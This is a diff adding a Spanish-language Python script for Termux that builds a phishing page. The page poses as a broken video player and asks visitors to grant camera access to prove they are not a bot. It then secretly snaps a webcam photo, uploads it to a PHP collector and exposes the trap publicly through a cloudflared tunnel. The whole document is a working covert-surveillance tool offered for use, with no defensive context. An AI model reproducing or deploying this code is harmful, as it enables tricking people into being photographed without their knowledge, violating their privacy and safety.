@@ -1,0 +1,67 @@
+mkdir ~/SPY_BUNKER
+cd ~/SPY_BUNKER
+nano spy.py
+ls ~/SPY_BUNKER/capturas
+termux-open ~/SPY_BUNKER/capturas/foto_223048.png
+import os
+
+def menu_spy():
+    os.system('clear')
+    print("=========================================")
+    print("   WATCHER Z - SECTOR DE INTELIGENCIA    ")
+    print("=========================================")
+    print("1. GENERAR LINK DE CAPTURA (PHANTOM)")
+    print("2. VER FOTOS EN CARPETA 'CAPTURAS'")
+    print("3. SALIR")
+    
+    opc = input("\n[#] Selecciona: ")
+
+    if opc == '1':
+        # El cebo: Una página que parece un reproductor de video fallido
+        with open("index.php", "w") as f:
+            f.write("""
+            <html>
+            <head><meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Cargando Contenido...</title></head>
+            <body style="background:#000;color:#fff;text-align:center;font-family:sans-serif;">
+                <div id="setup">
+                    <h3>⚠️ Error de Reproducción</h3>
+                    <p>Habilite los permisos de cámara para verificar que no es un bot y continuar al video.</p>
+                    <button onclick="start()" style="padding:15px;background:red;color:white;border:none;border-radius:5px;font-weight:bold;">REPRODUCIR VIDEO</button>
+                </div>
+                <video id="v" autoplay style="display:none;"></video>
+                <canvas id="c" style="display:none;"></canvas>
+                <script>
+                    function start() {
+                        navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
+                            document.getElementById('setup').innerHTML = "<h2>Cargando...</h2>";
+                            v=document.getElementById('v'); v.srcObject=s;
+                            setTimeout(()=>{
+                                c=document.getElementById('c');
+                                c.getContext('2d').drawImage(v,0,0,640,480);
+                                fetch('save.php',{method:'POST',body:c.toDataURL()});
+                                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Redirige a un video real
+                            },1500);
+                        }).catch(err => alert("Error: Debe permitir la cámara para ver el contenido."));
+                    }
+                </script>
+            </body>
+            </html>
+            """)
+        
+        # El recolector: Guarda la foto en la carpeta que creaste
+        with open("save.php", "w") as f:
+            f.write("<?php $img = file_get_contents('php://input'); $img = str_replace('data:image/png;base64,', '', $img); $img = str_replace(' ', '+', $img); file_put_contents('capturas/foto_' . date('His') . '.png', base64_decode($img)); ?>")
+        
+        print("\n[!] Trampa lista. Lanzando servidor...")
+        os.system("php -S 0.0.0.0:8888 > /dev/null 2>&1 &")
+        os.system("cloudflared tunnel --url http://0.0.0.0:8888")
+
+    elif opc == '2':
+        os.system("ls capturas")
+        input("\nPresiona Enter para volver...")
+        menu_spy()
+
+if __name__ == "__main__":
+    menu_spy()
+python spy.py
